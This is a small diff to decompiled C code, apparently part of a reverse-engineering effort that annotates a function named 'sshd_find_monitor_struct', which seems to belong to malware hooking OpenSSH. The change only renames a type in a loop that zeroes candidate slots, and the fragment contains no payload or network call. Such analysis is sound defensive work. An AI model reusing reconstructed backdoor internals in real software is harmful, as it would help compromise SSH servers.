@@ -54,7 +54,7 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
       candidate_cursor = monitor_candidates;
       // AutoDoc: Zero both the candidate slots and the tail half of the vote table before collecting fresh samples.
       for (vote_inner_idx = 0x14; vote_inner_idx != 0; vote_inner_idx = vote_inner_idx + -1) {
-        *(undefined4 *)candidate_cursor = 0;
+        *(u32 *)candidate_cursor = 0;
         candidate_cursor = (void **)((long)candidate_cursor + (ulong)zero_seed * -8 + 4);
       }
       do {
